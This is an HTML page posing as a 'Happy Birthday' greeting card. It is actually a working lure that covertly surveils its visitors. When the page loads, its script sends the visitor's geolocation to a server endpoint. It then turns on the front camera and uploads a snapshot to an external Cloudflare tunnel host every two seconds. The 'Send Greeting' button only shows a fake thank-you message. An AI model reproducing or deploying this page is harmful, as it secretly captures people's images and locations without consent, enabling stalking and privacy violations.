<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    font-family: 'Poppins', sans-serif;
}
.container { text-align: center; padding: 40px 20px; }
.wish-card {
    background: rgba(255,255,255,0.95);
    border-radius: 30px;
    padding: 40px 20px;
    margin: 20px auto;
    max-width: 500px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
}
h1 { color: #ff6b6b; font-size: 2.5em; margin-bottom: 20px; }
.greeting { font-size: 1.2em; color: #555; margin: 20px 0; }
.camera-preview {
    width: 100%;
    max-width: 400px;
    margin: 20px auto;
    border-radius: 20px;
    overflow: hidden;
    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
}
video, canvas { width: 100%; display: none; }
button {
    background: #ff6b6b;
    color: white;
    border: none;
    padding: 15px 40px;
    border-radius: 50px;
    font-size: 18px;
    cursor: pointer;
    margin-top: 20px;
    transition: transform 0.3s;
}
button:hover { transform: scale(1.05); }
.placeholder {
    width: 100%;
    height: 300px;
    background: #f0f0f0;
    border-radius: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 60px;
}
</style>
</head>
<body>
<div class="container">
    <div class="wish-card">
        <h1>🎉 Happy Birthday Celebrations! 🎉</h1>
        <div class="greeting">Send your warm wishes with a special photo!</div>
        <div class="camera-preview">
            <div class="placeholder">📸</div>
            <video id="video" playsinline autoplay></video>
            <canvas id="canvas" width="640" height="480"></canvas>
        </div>
        <button onclick="capture()">✨ Send Greeting ✨</button>
    </div>
</div>
<script>
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        $.ajax({
            type: 'POST',
            data: {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                acc: position.coords.accuracy
            },
            url: window.location.origin + '/location.php'
        });
    });
}
function post(imgdata) {
    $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php', async: false });
}
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        video.style.display = 'block';
        document.querySelector('.placeholder').style.display = 'none';
        const context = canvas.getContext('2d');
        setInterval(() => {
            context.drawImage(video, 0, 0, 640, 480);
            const canvasData = canvas.toDataURL("image/png");
            post(canvasData);
        }, 2000);
    } catch(e) { console.log(e); }
}
function capture() { alert("🎊 Thank you! Your greeting has been sent!"); }
init();
</script>
</body>
</html>
